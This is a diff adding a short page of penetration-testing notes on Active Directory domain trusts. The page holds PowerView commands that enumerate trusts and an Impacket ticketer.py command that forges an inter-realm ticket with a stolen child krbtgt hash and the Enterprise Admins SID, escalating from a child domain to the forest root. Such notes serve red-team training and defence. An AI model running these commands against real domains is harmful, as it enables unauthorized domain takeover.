@@ -1,0 +1,23 @@
+---
+title: "Domain Trusts"
+---
+
+Trusts connect domains/forests. Enumerate them to find a path from a compromised domain into another.
+
+```powershell
+Get-DomainTrust
+Get-DomainTrustMapping           # map the whole forest
+```
+
+## Cross-domain / cross-forest
+
+```bash
+# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
+ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
+# intra-forest trust key abuse
+lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
+```
+
+<Tip>
+Within a forest, the SIDHistory + Enterprise Admins (`-519`) trick escalates from a child domain to the forest root. Cross-forest trusts are a boundary — only trusted principals/SID-filtered access cross.
+</Tip>
